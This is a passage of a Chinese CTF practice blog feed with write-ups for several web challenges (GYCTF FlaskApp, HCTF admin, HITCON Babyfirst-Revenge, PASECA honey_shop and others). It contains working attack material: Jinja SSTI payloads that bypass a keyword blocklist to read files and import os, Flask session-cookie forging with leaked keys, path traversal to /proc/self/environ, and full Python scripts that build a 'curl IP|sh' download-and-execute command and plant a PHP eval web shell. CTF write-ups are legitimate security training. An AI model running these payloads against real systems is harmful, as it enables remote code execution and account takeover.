<li>变换表名(不可以<code>alter</code>限制)</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020FlaskApp</title>
    <url>/2021/01/21/blog_formal/security/CTF/GYCTF2020FlaskApp/</url>
    <content><![CDATA[<h1 id="GYCTF2020FlaskApp"><a href="#GYCTF2020FlaskApp" class="headerlink" title="GYCTF2020FlaskApp"></a>GYCTF2020FlaskApp</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>flask ssti</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页，寻找一些线索</li>
</ul>
<p><img data-src="./GYCTF2020FlaskApp/1.png" alt></p>
<p><img data-src="./GYCTF2020FlaskApp/2.png" alt></p>
<p>貌似受到了嘲讽，哈哈哈</p>
<ul>
<li>解密尝试输入非法字符</li>
</ul>
<p><img data-src="./GYCTF2020FlaskApp/3.png" alt></p>
<p>备注：<code>ssti</code>注入问题，但是有了<code>waf</code>过滤</p>
<ul>
<li>验证一波</li>
</ul>
<p><img data-src="./GYCTF2020FlaskApp/4.png" alt></p>
<p><img data-src="./GYCTF2020FlaskApp/5.png" alt></p>
<p>但是如果是 <code>12</code>,则会输出<code>nonono</code></p>
<p><img data-src="./GYCTF2020FlaskApp/6.png" alt></p>
<ul>
<li>查看<code>app.py</code>源码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br></pre></td></tr></table></figure>

<p><img data-src="./GYCTF2020FlaskApp/7.png" alt></p>
<p>相关过滤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1</span><br><span class="line">                            </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">"flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"</span><br></pre></td></tr></table></figure>

<ul>
<li>目录遍历<code>payload</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">e3snJy5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXVsnX19pbXAnKydvcnRfXyddKCdvJysncycpLmxpc3RkaXIoJy8nKX19</span><br></pre></td></tr></table></figure>

<p><img data-src="./GYCTF2020FlaskApp/8.png" alt></p>
<p>发现目标文件<code>this_is_the_flag.txt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br></pre></td></tr></table></figure>

<p><img data-src="./GYCTF2020FlaskApp/9.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>flask ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF2018admin</title>
    <url>/2021/03/19/blog_formal/security/CTF/HCTF2018admin/</url>
    <content><![CDATA[<h1 id="HCTF2018admin"><a href="#HCTF2018admin" class="headerlink" title="HCTF2018admin"></a>HCTF2018admin</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>源码泄露</li>
<li><code>flask_session</code>破解</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./HCTF2018admin/1.png" alt></p>
<ul>
<li>注册登录账号</li>
</ul>
<p><img data-src="./HCTF2018admin/2.png" alt></p>
<ul>
<li>修改密码处发现源码泄露</li>
</ul>
<p><img data-src="./HCTF2018admin/3.png" alt></p>
<ul>
<li>源码审计，发现<code>Flask</code> 框架 + <code>session_key</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span><span class="params">(object)</span>:</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'mysql+pymysql://root:adsl1234@db:3306/test'</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解密<code>session</code></li>
</ul>
<p><img data-src="./HCTF2018admin/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> decode</span></span><br><span class="line">python3 flask_session_cookie_manager3.py decode -c '.eJxFkEGLwjAQhf_KkrOHNrYXwUOlblGYCXVTw-RSXK22ycaFqrRE_O8bXdiFOTx4w3vfzJ3Vx765tGx27W_NhNXdgc3u7O2TzRh53ZKxqVbrDtUqFvLQgskSzLdf4BcWuW5F_m7IVCnwKtLFaiC5diAXBo1NdE4jBa2L5QAyaIcWvbZCZhwMpOgpQl5NgZeDCB3EtSVPI-b7hNS2065KhVwl2pxi9NkYdhNwZaTVxoJZJqDWLnREQsKcPSZsf-mP9fXbNuf_E3gZY15OUZUD-vaJOmizMJDT9IkUsFMsliOpJz4MoiAuyvkrrnO7U_OX9HHeFCr7dc47Fwy233Vh2ITdLk3_ehyLI_b4AdzEa6c.YFQFyA.NHYkvHV8SUmgBOoFwiYYvAumGNc' -s 'ckj123'</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">&#123;'_fresh': True, '_id': b'c6ab99ebb5b597a20845e30d7fa81cb593e4db0a2f10c698d61a0cda0161bcd76d9062397647e73d09bbcfdc61478aebfe9928f857017e82d4edd2181bfd6493', 'csrf_token': b'cd54475d078cb50f0c0671613e94a1ae4dc08f69', 'image': b'JtFX', 'name': 'caicai', 'user_id': '10'&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> encode</span></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t '&#123;"_fresh": True, "_id": b"c6ab99ebb5b597a20845e30d7fa81cb593e4db0a2f10c698d61a0cda0161bcd76d9062397647e73d09bbcfdc61478aebfe9928f857017e82d4edd2181bfd6493", "csrf_token": b"cd54475d078cb50f0c0671613e94a1ae4dc08f69", "image": b"JtFX", "name": "admin", "user_id": "1"&#125;'</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">.eJxFkEGLwjAQhf_KkrOHNrYXwUOlblGYCXVTw-QirlbbZNOFqrRE_O8bXdi9PXjDe9-8O9ud-vrSsNm1v9UTtmuPbHZnb59sxsjrhoxNtVq3qFaxkMcGTJZgvv0Cv7DIdSPyd0OmSoFXkS5WA8m1A7kwaGyicxopaF0sB5BBO7TotRUy42AgRU8R8moKvBxE6CCuLXkaMT8kpLatdlUq5CrR5hyjz8Zwm4ArI602FswyAbV2oSMSEubsMWGHS3_aXb9t3f2_wMsY83KKqhzQN0_UQZuFgZymT6SAnWKxHEk98WEQBXFRzl9xrduf67-kj25TqOzX6fYuGGx_dG3HJux2qfvXbixmjx8FpWsm.YFQQcQ.yi_DsQJ6OnW1lghlwakPgPUtgbQ</span><br></pre></td></tr></table></figure>

<ul>
<li>更换<code>session</code></li>
</ul>
<p><img data-src="./HCTF2018admin/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>源码泄露</tag>
        <tag>flask_session破解</tag>
      </tags>
  </entry>
  <entry>
    <title>HITCON2017Babyfirst-Revenge-V2</title>
    <url>/2021/04/06/blog_formal/security/CTF/HITCON2017Babyfirst-Revenge-V2/</url>
    <content><![CDATA[<h1 id="HITCON2017Babyfirst-Revenge-V2"><a href="#HITCON2017Babyfirst-Revenge-V2" class="headerlink" title="HITCON2017Babyfirst-Revenge-V2"></a>HITCON2017Babyfirst-Revenge-V2</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>命令注入绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./HITCON2017Babyfirst-Revenge-V2/1.png" alt></p>
<ul>
<li>源码审计</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">'REMOTE_ADDR'</span>].<span class="string">"\n"</span>;</span><br><span class="line">    $sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>发现为命令注入绕过</p>
</li>
<li><p>编写攻击脚本</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>, </span><br><span class="line">    <span class="string">'&gt;sl'</span>, </span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate "curl 127.0.0.1/|sh"  0x7f000001 2130706433 10.154.106.190/</span></span><br><span class="line">    <span class="string">'&gt;\;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;sh\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="comment">#'&gt;h\\', </span></span><br><span class="line">    <span class="comment">#'&gt;s\\', </span></span><br><span class="line">    <span class="comment">#'&gt;8.\\', </span></span><br><span class="line">    <span class="comment">#'&gt;//\\', </span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="string">'&gt;0\\'</span>,</span><br><span class="line">    <span class="string">'&gt;19\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;4.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;15\\'</span>, </span><br><span class="line">    <span class="string">'&gt;0.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;1\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#'&gt;\;\\', </span></span><br><span class="line">    <span class="comment">#'&gt;on\\', </span></span><br><span class="line">    <span class="comment">#'&gt;th\\', </span></span><br><span class="line">    <span class="comment">#'&gt;py\\', </span></span><br><span class="line">    <span class="comment">#'&gt;\|\\', </span></span><br><span class="line">    <span class="comment">#'&gt;tw\\',</span></span><br><span class="line">    <span class="comment">#'&gt;e.\\', </span></span><br><span class="line">    <span class="comment">#'&gt;ng\\', </span></span><br><span class="line">    <span class="comment">#'&gt;ra\\', </span></span><br><span class="line">    <span class="comment">#'&gt;o\\', </span></span><br><span class="line">    <span class="comment">#'&gt;\ \\', </span></span><br><span class="line">    <span class="comment">#'&gt;rl\\', </span></span><br><span class="line">    <span class="comment">#'&gt;cu\\', </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    <span class="string">'sh x'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://10.154.106.190/laotie2.php?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">4</span></span><br><span class="line">    r = requests.get(<span class="string">'http://10.154.106.190/laotie2.php?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>个人服务器的<code>index.html</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;?php @eval($_REQUEST[4396]); ?&gt;&#39; &gt;shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./HITCON2017Babyfirst-Revenge-V2/2.png" alt></p>
<ul>
<li>中国蚁剑</li>
</ul>
<p><img data-src="./HITCON2017Babyfirst-Revenge-V2/3.png" alt></p>
<p>根目录拿到<code>flag</code></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>命令注入绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>HITCON2017Babyfirst-Revenge</title>
    <url>/2021/04/06/blog_formal/security/CTF/HITCON2017Babyfirst-Revenge/</url>
    <content><![CDATA[<h1 id="HITCON2017Babyfirst-Revenge"><a href="#HITCON2017Babyfirst-Revenge" class="headerlink" title="HITCON2017Babyfirst-Revenge"></a>HITCON2017Babyfirst-Revenge</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>命令注入绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./HITCON2017Babyfirst-Revenge/1.png" alt></p>
<ul>
<li>源码审计</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> $_SERVER[<span class="string">'REMOTE_ADDR'</span>].<span class="string">"\n"</span>;</span><br><span class="line">   $sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">   @mkdir($sandbox);</span><br><span class="line">   @chdir($sandbox);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">       @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">       @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>发现为命令注入绕过</p>
</li>
<li><p>编写攻击脚本</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># generate "curl 127.0.0.1/|sh"  0x7f000001 2130706433 10.154.106.190/</span></span><br><span class="line">    <span class="string">'&gt;\;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;sh\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="comment">#'&gt;h\\', </span></span><br><span class="line">    <span class="comment">#'&gt;s\\', </span></span><br><span class="line">    <span class="comment">#'&gt;8.\\', </span></span><br><span class="line">    <span class="comment">#'&gt;//\\', </span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="string">'&gt;0\\'</span>,</span><br><span class="line">    <span class="string">'&gt;19\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;4.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;15\\'</span>, </span><br><span class="line">    <span class="string">'&gt;0.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;1\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># generate `curl orange.tw|python`</span></span><br><span class="line">    <span class="comment">#'&gt;on', </span></span><br><span class="line">    <span class="comment">#'&gt;th\\', </span></span><br><span class="line">    <span class="comment">#'&gt;py\\', </span></span><br><span class="line">    <span class="comment">#'&gt;\|\\', </span></span><br><span class="line">    <span class="comment">#'&gt;tw\\',</span></span><br><span class="line">    <span class="comment">#'&gt;e.\\', </span></span><br><span class="line">    <span class="comment">#'&gt;ng\\', </span></span><br><span class="line">    <span class="comment">#'&gt;ra\\', </span></span><br><span class="line">    <span class="comment">#'&gt;o\\', </span></span><br><span class="line">    <span class="comment">#'&gt;\ \\', </span></span><br><span class="line">    <span class="comment">#'&gt;rl\\', </span></span><br><span class="line">    <span class="comment">#'&gt;cu\\', </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://10.154.106.190/laotie1.php</span></span><br><span class="line">r = requests.get(<span class="string">'http://10.154.106.190/laotie1.php?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://10.154.106.190/laotie1.php?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>个人服务器的<code>index.html</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;?php @eval($_REQUEST[4396]); ?&gt;&#39; &gt;shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./HITCON2017Babyfirst-Revenge/2.png" alt></p>
<ul>
<li>中国蚁剑</li>
</ul>
<p><img data-src="./HITCON2017Babyfirst-Revenge/3.png" alt></p>
<p>根目录拿到<code>flag</code></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>命令注入绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020Ez_bypass</title>
    <url>/2021/02/03/blog_formal/security/CTF/MRCTF2020Ez_bypass/</url>
    <content><![CDATA[<h1 id="MRCTF2020Ez-bypass"><a href="#MRCTF2020Ez-bypass" class="headerlink" title="MRCTF2020Ez_bypass"></a>MRCTF2020Ez_bypass</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>==绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./MRCTF2020Ez_bypass/1.png" alt></p>
<ul>
<li>源码审计</li>
</ul>
<p><img data-src="./MRCTF2020Ez_bypass/2.png" alt></p>
<ul>
<li>绕过姿势</li>
</ul>
<p><img data-src="./MRCTF2020Ez_bypass/3.png" alt></p>
<p>easy…</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>==绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020PYWebsite</title>
    <url>/2021/03/12/blog_formal/security/CTF/MRCTF2020PYWebsite/</url>
    <content><![CDATA[<h1 id="MRCTF2020PYWebsite"><a href="#MRCTF2020PYWebsite" class="headerlink" title="MRCTF2020PYWebsite"></a>MRCTF2020PYWebsite</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>XFF</code>绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./MRCTF2020PYWebsite/1.png" alt></p>
<ul>
<li>右键查看网页源码发现</li>
</ul>
<p><img data-src="./MRCTF2020PYWebsite/2.png" alt></p>
<ul>
<li>直接访问<code>flag.php</code></li>
</ul>
<p><img data-src="./MRCTF2020PYWebsite/3.png" alt></p>
<ul>
<li>提示源<code>ip</code>绕过</li>
</ul>
<p><img data-src="./MRCTF2020PYWebsite/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>XFF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>PASECA2019honey_shop</title>
    <url>/2021/03/05/blog_formal/security/CTF/PASECA2019honey_shop/</url>
    <content><![CDATA[<h1 id="PASECA2019honey-shop"><a href="#PASECA2019honey-shop" class="headerlink" title="PASECA2019honey_shop"></a>PASECA2019honey_shop</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件包含</li>
<li><code>flask session secret</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./PASECA2019honey_shop/1.png" alt></p>
<ul>
<li>发现文件包含问题</li>
</ul>
<p><img data-src="./PASECA2019honey_shop/2.png" alt></p>
<ul>
<li>查看进程信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /download?image=../../../../proc/self/environ HTTP/1.1</span><br></pre></td></tr></table></figure>

<p><img data-src="./PASECA2019honey_shop/3.png" alt></p>
<ul>
<li><p><code>SECRET_KEY=xl1FTZw21ugCDbZ2OYAhkJSgvWMtKhX0qdLSrEVj</code></p>
</li>
<li><p>工具破解<code>flask session</code></p>
<p><a href="https://github.com/noraj/flask-session-cookie-manager.git" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager.git</a></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 flask_session_cookie_manager2.py decode -c &#39;eyJiYWxhbmNlIjoxMzM2LCJwdXJjaGFzZXMiOltdfQ.YEGhrQ.ntUi0tXVDFAtEkCq8g3pgBwq2OA&#39; -s &#39;xl1FTZw21ugCDbZ2OYAhkJSgvWMtKhX0qdLSrEVj&#39;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>RootersCTF2019I_&lt;3_Flask</title>
    <url>/2021/07/28/blog_formal/security/CTF/RootersCTF2019I_3_Flask/</url>
    <content><![CDATA[<h1 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>ssti</code>注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./RootersCTF2019I_3_Flask/1.png" alt></p>
<ul>
<li><code>arjun</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arjun -u http://1d1dc355-381e-4738-97f6-250d797a8aaa.node4.buuoj.cn/ -c 100 -d 5</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/sangfor# arjun -u http://1d1dc355-381e-4738-97f6-250d797a8aaa.node4.buuoj.cn/ -c 100 -d 5</span><br><span class="line">    _</span><br><span class="line">   /_| _ '</span><br><span class="line">  (  |/ /(//) v2.1.41</span><br><span class="line">      _/      </span><br><span class="line"></span><br><span class="line">[*] Probing the target for stability</span><br><span class="line">[*] Analysing HTTP response for anamolies</span><br><span class="line">[*] Analysing HTTP response for potential parameter names</span><br><span class="line">[*] Logicforcing the URL endpoint</span><br><span class="line">[✓] name: name, factor: body length</span><br></pre></td></tr></table></figure>

<p>发现注入字段</p>
<ul>
<li><code>tplmap</code></li>
</ul>
